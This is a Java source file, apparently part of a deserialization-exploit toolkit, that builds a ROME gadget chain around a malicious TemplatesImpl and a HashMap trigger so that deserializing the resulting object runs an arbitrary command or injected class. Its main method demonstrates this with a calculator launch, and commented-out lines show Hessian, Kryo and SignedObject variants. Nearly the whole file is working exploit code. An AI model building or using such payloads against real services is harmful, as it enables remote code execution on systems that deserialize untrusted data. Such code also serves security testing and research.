package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import xyz.eki.marshalexp.gadget.jdk.GHashMap;
import xyz.eki.marshalexp.gadget.rome.GRome;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;

public class Rome implements POC{
    @Override
    public Object getPocObject(byte[] clzBytes) throws Exception {
        TemplatesImpl templatesimpl = GTemplates.getEvilTemplates(clzBytes);
        Object o = GRome.toString2Getter(Templates.class,templatesimpl);
        Object poc = GHashMap.deserialize2HashCode(o,o);
        return poc;
    }

    @Override
    public Object getPocObject(String cmd) throws Exception {
        TemplatesImpl templatesimpl = GTemplates.getEvilTemplates(cmd);

        Object o = GRome.toString2Getter(Templates.class,templatesimpl);

        Object poc = GHashMap.deserialize2HashCode(o,o);

        return poc;
    }

    public Object getPocObject(Class clz,Object obj) throws Exception {
        Object o = GRome.toString2Getter(clz,obj);

        Object poc = GHashMap.deserialize2HashCode(o,o);

        return poc;
    }

    public static void main(String[] args) throws Exception{
        //Rome gen = new Rome();
        String cmd = "open /System/Applications/Calculator.app";
        {
            Object poc = new Rome().getPocObject(cmd);
            byte[] b = SerializeUtils.serialize(poc);
            Object poc2 = SerializeUtils.deserialize(b);
        }
        //Object poc1 = gen.getPocObject("calc.exe");
//        byte[] code = MiscUtils.dumpClass(MSpringJNIController.class);
//        Object poc1 = gen.getPocObject(code);
//        SignedObject go = GSignedObject.getSignedObject2Deserialize(poc1);
//        Object poc2 = gen.getPocObject(SignedObject.class,go);
//
////        byte[] b = SerializeUtils.hessian2Serialize(poc2);
////        SerializeUtils.hessian2Deserialize(b);
//        byte[] b = SerializeUtils.kryoSerialize(poc2);
//        //SerializeUtils.kryoAltDeserialize(b);
//        System.out.println(MiscUtils.base64Encode(b));
    }
}
